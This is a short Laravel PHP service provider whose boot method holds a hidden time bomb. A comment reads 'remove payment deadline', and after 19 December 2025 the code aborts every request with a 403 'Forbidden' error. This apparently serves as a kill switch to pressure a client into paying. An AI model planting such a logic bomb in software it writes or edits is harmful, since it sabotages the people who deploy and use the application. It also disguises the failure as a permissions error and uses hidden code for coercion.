<?php

namespace App\Providers;

use Carbon\Carbon;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Gate;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
    // remove payment deadline 
    $deadline = Carbon::create(2025, 12, 19);

    if (Carbon::now()->greaterThan($deadline)) {
        abort(403, 'Forbidden');
    }
    }
}
